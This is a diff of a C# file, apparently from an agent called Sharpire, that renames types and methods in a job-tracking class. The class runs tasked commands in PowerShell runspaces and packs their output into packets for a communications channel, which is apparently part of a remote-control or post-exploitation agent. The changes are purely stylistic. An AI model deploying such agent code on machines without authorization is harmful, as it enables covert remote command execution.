@@ -11,26 +11,26 @@ namespace Sharpire
     ////////////////////////////////////////////////////////////////////////////////
     public class JobTracking
     {
-        public Dictionary<String, Job> jobs;
-        public Dictionary<String, UInt16> jobsId;
-        public Byte[] ImportedScript { get; set; }
+        public Dictionary<string, Job> jobs;
+        public Dictionary<string, ushort> jobsId;
+        public byte[] ImportedScript { get; set; }
 
         ////////////////////////////////////////////////////////////////////////////////
         public JobTracking()
         {
-            jobs = new Dictionary<String, Job>();
-            jobsId = new Dictionary<String, UInt16>();
+            jobs = new Dictionary<string, Job>();
+            jobsId = new Dictionary<string, ushort>();
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        internal void CheckAgentJobs(ref Byte[] packets, ref Coms coms)
+        internal void CheckAgentJobs(ref byte[] packets, ref Coms coms)
         {
             lock (jobs)
             {
-                List<String> jobsToRemove = new List<String>();
+                List<string> jobsToRemove = new List<string>();
                 foreach (KeyValuePair<string, Job> job in jobs)
                 {
-                    String results = "";
+                    string results = "";
                     if (job.Value.IsCompleted())
                     {
                         try
@@ -41,7 +41,7 @@ namespace Sharpire
                         catch (NullReferenceException) { }
 
                         jobsToRemove.Add(job.Key);
-                        packets = Misc.combine(packets, coms.encodePacket(110, results, jobsId[job.Key]));
+                        packets = Misc.combine(packets, coms.EncodePacket(110, results, jobsId[job.Key]));
                     }
                 }
                 jobsToRemove.ForEach(x => jobs.Remove(x));
@@ -54,15 +54,15 @@ namespace Sharpire
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        internal Byte[] GetAgentJobsOutput(ref Coms coms)
+        internal byte[] GetAgentJobsOutput(ref Coms coms)
         {
-            Byte[] jobResults = new Byte[0];
+            byte[] jobResults = new byte[0];
             lock (jobs)
             {
-                List<String> jobsToRemove = new List<String>();
-                foreach (String jobName in jobs.Keys)
+                List<string> jobsToRemove = new List<string>();
+                foreach (string jobName in jobs.Keys)
                 {
-                    String results = "";
+                    string results = "";
                     if (jobs[jobName].IsCompleted())
                     {
                         try
@@ -80,7 +80,7 @@ namespace Sharpire
 
                     if (0 < results.Length)
                     {
-                        jobResults = Misc.combine(jobResults, coms.encodePacket(110, results, jobsId[jobName]));
+                        jobResults = Misc.combine(jobResults, coms.EncodePacket(110, results, jobsId[jobName]));
                     }
                 }
                 jobsToRemove.ForEach(x => jobs.Remove(x));
@@ -94,19 +94,19 @@ namespace Sharpire
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        internal String StartAgentJob(String command, UInt16 taskId)
+        internal string StartAgentJob(string command, ushort taskId)
         {
             Random random = new Random();
-            String characters = "ABCDEFGHKLMNPRSTUVWXYZ123456789";
-            Char[] charactersArray = characters.ToCharArray();
+            string characters = "ABCDEFGHKLMNPRSTUVWXYZ123456789";
+            char[] charactersArray = characters.ToCharArray();
             StringBuilder sb = new StringBuilder(8);
-            for (Int32 i = 0; i < 8; i++)
+            for (int i = 0; i < 8; i++)
             {
-                Int32 j = random.Next(charactersArray.Length);
+                int j = random.Next(charactersArray.Length);
                 sb.Append(charactersArray[j]);
             }
 
-            String id = sb.ToString();
+            string id = sb.ToString();
             lock (jobs)
             {
                 jobs.Add(id, new Job(command));
@@ -123,12 +123,12 @@ namespace Sharpire
         public class Job
         {
             private Thread JobThread { get; set; }
-            private static String output = "";
-            private static Boolean isFinished = false;
+            private static string output = "";
+            private static bool isFinished = false;
 
             ////////////////////////////////////////////////////////////////////////////////
             ////////////////////////////////////////////////////////////////////////////////
-            public Job(String command)
+            public Job(string command)
             {
                 JobThread = new Thread(() => RunPowerShell(command));
                 JobThread.Start();
@@ -136,7 +136,7 @@ namespace Sharpire
 
             ////////////////////////////////////////////////////////////////////////////////
             ////////////////////////////////////////////////////////////////////////////////
-            public static void RunPowerShell(String command)
+            public static void RunPowerShell(string command)
             {
                 using (Runspace runspace = RunspaceFactory.CreateRunspace())
                 {
@@ -182,7 +182,7 @@ namespace Sharpire
 
             ////////////////////////////////////////////////////////////////////////////////
             ////////////////////////////////////////////////////////////////////////////////
-            public Boolean IsCompleted()
+            public bool IsCompleted()
             {
                 if (null != JobThread)
                 {
@@ -200,7 +200,7 @@ namespace Sharpire
 
             ////////////////////////////////////////////////////////////////////////////////
             ////////////////////////////////////////////////////////////////////////////////
-            public String GetOutput()
+            public string GetOutput()
             {
                 return output;
             }
